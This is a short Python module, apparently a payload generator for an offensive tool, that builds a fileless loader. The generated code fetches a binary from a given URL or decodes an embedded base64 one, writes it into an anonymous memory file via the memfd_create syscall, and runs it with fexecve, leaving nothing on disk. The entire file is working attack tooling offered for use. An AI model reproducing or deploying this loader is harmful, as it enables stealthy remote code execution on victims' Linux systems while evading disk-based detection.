import base64



desc = {"name" : "memfd_create", "description" : "Payload using memfd_create", "archs" : "all", "python_vers" : ">2.5"}

def main(is_url, url_or_payload):
    payload = '''import ctypes, os, urllib2, base64
libc = ctypes.CDLL(None)
argv = ctypes.pointer((ctypes.c_char_p * 0)(*[]))
syscall = libc.syscall
fexecve = libc.fexecve'''
    if is_url:
        payload += '\ncontent = urllib2.urlopen("{}").read()'.format(url_or_payload)
    else:
        encoded_payload = base64.b64encode(url_or_payload).decode()
        payload += '\ncontent = base64.b64decode("{}")'.format(encoded_payload)
    payload += '''\nfd = syscall(319, "", 1)
os.write(fd, content)
fexecve(fd, argv, argv)'''
    return payload